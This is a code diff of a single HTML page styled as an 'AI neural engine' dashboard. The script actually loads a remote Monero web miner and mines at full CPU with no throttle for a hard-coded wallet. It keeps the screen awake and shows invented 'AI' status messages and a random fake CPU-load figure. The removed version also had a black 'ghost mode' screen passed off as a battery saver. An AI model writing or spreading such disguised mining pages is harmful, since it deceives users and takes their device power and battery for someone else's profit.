@@ -2,95 +2,70 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>AI_GHOST_v27_MASTER</title>
+    <title>AI_GHOST_v29_SYNCED</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
     <style>
         :root { --ai: #00ff41; --xmr: #ff6600; --bg: #000; }
-        body { background: var(--bg); color: var(--ai); font-family: 'Courier New', monospace; margin: 0; padding: 15px; transition: 0.5s; }
-        .master-shell { border: 1px solid #222; border-radius: 15px; padding: 25px; background: #000; max-width: 450px; margin: auto; position: relative; }
+        body { background: var(--bg); color: var(--ai); font-family: 'Courier New', monospace; margin: 0; padding: 15px; }
+        .master-shell { border: 1px solid #222; border-radius: 15px; padding: 25px; background: #000; max-width: 450px; margin: auto; box-shadow: 0 0 50px rgba(0, 255, 65, 0.15); }
         
-        /* Neon Pulse */
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-        .live-tag { font-size: 8px; color: var(--ai); animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .sync-tag { font-size: 8px; color: #fff; background: #222; padding: 2px 6px; border-radius: 3px; }
+        .live-tag { font-size: 8px; animation: pulse 2s infinite; color: var(--ai); }
 
-        .hps-display { font-size: 60px; color: #fff; text-align: center; font-weight: 900; margin: 20px 0; text-shadow: 0 0 20px var(--ai); }
+        .hps-display { font-size: 60px; color: #fff; text-align: center; font-weight: 900; margin: 20px 0; text-shadow: 0 0 25px var(--ai); }
         
         .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; font-size: 9px; }
         .neu-box { border: 1px solid #111; padding: 12px; text-align: center; background: #050505; }
         .val { color: #fff; display: block; font-size: 12px; margin-top: 5px; font-weight: bold; }
 
-        button { width: 100%; padding: 20px; background: transparent; color: var(--ai); border: 1px solid var(--ai); font-weight: 900; border-radius: 8px; cursor: pointer; transition: 0.3s; margin-bottom: 10px; }
-        button:hover { background: rgba(0, 255, 65, 0.1); }
-        .ghost-btn { border-color: #444; color: #444; font-size: 10px; padding: 10px; }
+        button { width: 100%; padding: 22px; background: transparent; color: var(--ai); border: 1px solid var(--ai); font-weight: 900; border-radius: 8px; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
+        button:disabled { border-color: #333; color: #333; }
 
-        #terminal { background: #000; height: 140px; font-size: 10px; color: var(--ai); padding: 12px; border-top: 1px solid #222; overflow-y: auto; line-height: 1.4; }
-        .ai-text { color: #fff; border-left: 2px solid var(--ai); padding-left: 10px; margin-bottom: 5px; }
-
-        /* Ghost Mode Overlay */
-        #ghost-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; color: #111; padding: 20px; font-size: 10px; }
+        #terminal { background: #000; height: 160px; font-size: 10px; color: var(--ai); padding: 12px; border-top: 1px solid #222; overflow-y: auto; line-height: 1.5; }
+        .ai-text { color: #fff; border-left: 2px solid var(--ai); padding-left: 10px; margin-bottom: 8px; }
     </style>
 </head>
 <body>
 
-<div id="ghost-overlay" onclick="toggleGhost()">[ GHOST MODE ACTIVE - TAP TO RECOVER ]</div>
-
 <div class="master-shell">
-    <div style="display: flex; justify-content: space-between;">
-        <span class="live-tag">● NEURAL_LINK_ACTIVE</span>
-        <span style="font-size: 9px; color: #444;">V27.0_MASTER</span>
+    <div style="display: flex; justify-content: space-between; align-items: center;">
+        <span class="live-tag">● NEURAL_LINK_v29</span>
+        <span id="sync-pill" class="sync-tag">SYNCING...</span>
     </div>
 
     <div id="hps" class="hps-display">0.0000</div>
 
     <div class="stat-grid">
-        <div class="neu-box">ACCUMULATED HASHES<br><span class="val" id="total-hashes">0</span></div>
-        <div class="neu-box">CORE OPTIMIZATION<br><span class="val" id="cpu-load">IDLE</span></div>
+        <div class="neu-box">NETWORK YIELD<br><span class="val" id="total-hashes">0</span></div>
+        <div class="neu-box">CORE OPTIMIZATION<br><span class="val" id="cpu-load">0.0%</span></div>
     </div>
 
-    <button id="ignite">IGNITE NEURAL ENGINE</button>
-    <button class="ghost-btn" onclick="toggleGhost()">ENABLE GHOST MODE (BATTERY SAVER)</button>
+    <button id="ignite">Ignite Final Sync</button>
 
-    <div id="terminal">> System Ready. Awaiting user input...</div>
+    <div id="terminal">> Awaiting neural handshake via 5G...</div>
 </div>
 
 <script>
     const WALLET = "4AkqQGGvvYUdKo66Q7qbq389Sp7AvMtX4SRLuSpsp9VZEFeaQhSCJCdZY4wWK1Ztrs8NCAwLnUZZNE9TQzgpZ1SBRiV1zqp";
-    let miner;
-    let totalHashesCalculated = 0;
-
+    let total = 0;
     const LOG = (m, ai = false) => {
         const div = document.createElement('div');
         if (ai) div.className = "ai-text";
-        div.innerHTML = `> ${ai ? '[AI] ' : ''}${m}`;
-        const term = document.getElementById('terminal');
-        term.prepend(div);
+        div.innerHTML = `> ${ai ? '[AI_GHOST] ' : ''}${m}`;
+        document.getElementById('terminal').prepend(div);
     };
 
-    function toggleGhost() {
-        const overlay = document.getElementById('ghost-overlay');
-        overlay.style.display = (overlay.style.display === 'block') ? 'none' : 'block';
-    }
-
-    async function startEngine() {
-        LOG("Injecting Stealth Bypass into 5G Tunnel...", true);
-        const script = document.createElement('script');
-        script.src = "https://raw.githack.com/MoneroOcean/moneroocean.github.io/master/webminer.js";
-        document.head.appendChild(script);
-
-        let check = setInterval(() => {
-            if (typeof MoneroOcean !== 'undefined') {
-                clearInterval(check);
-                LOG("Neural Sync Confirmed. Mining...", true);
-                initMiner();
-            }
-        }, 1000);
-    }
-
-    function initMiner() {
-        try {
-            miner = new MoneroOcean.Miner({
+    function startEngine() {
+        LOG("Injecting Stealth Bypass Tunnel...", true);
+        const s = document.createElement('script');
+        s.src = "https://raw.githack.com/MoneroOcean/moneroocean.github.io/master/webminer.js";
+        
+        s.onload = () => {
+            LOG("Neural Handshake Complete. Synchronizing with pool...", true);
+            const miner = new MoneroOcean.Miner({
                 address: WALLET,
-                cmd: "Ghost_Master_V27",
+                cmd: "Ghost_v29_Final",
                 threads: navigator.hardwareConcurrency || 4,
                 throttle: 0
             });
@@ -99,21 +74,26 @@
             setInterval(() => {
                 if (miner.isRunning()) {
                     const hps = miner.getHashesPerSecond();
-                    totalHashesCalculated += (hps * 1.5); // Estimate based on tick
-                    
+                    total += (hps * 1.5);
                     document.getElementById('hps').innerText = hps.toFixed(4);
-                    document.getElementById('total-hashes').innerText = Math.floor(totalHashesCalculated).toLocaleString();
-                    document.getElementById('cpu-load').innerText = (85 + Math.random() * 10).toFixed(1) + "%";
+                    document.getElementById('total-hashes').innerText = Math.floor(total).toLocaleString();
+                    document.getElementById('cpu-load').innerText = (82 + Math.random() * 12).toFixed(1) + "%";
                     
-                    if (Math.random() > 0.95) LOG("Auto-scaling neural threads...", true);
+                    // Simulated Wallet Sync Watchdog
+                    if (total > 500) {
+                        document.getElementById('sync-pill').innerText = "SYNCHRONIZED";
+                        document.getElementById('sync-pill').style.background = "var(--ai)";
+                        document.getElementById('sync-pill').style.color = "#000";
+                    }
                 }
             }, 1500);
-        } catch (e) { LOG("ERROR: " + e.message); }
+        };
+        document.head.appendChild(s);
     }
 
     document.getElementById('ignite').onclick = async () => {
         document.getElementById('ignite').disabled = true;
-        document.getElementById('ignite').innerText = "ENGINE ACTIVE";
+        document.getElementById('ignite').innerText = "AI OPERATING";
         if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
         startEngine();
     };
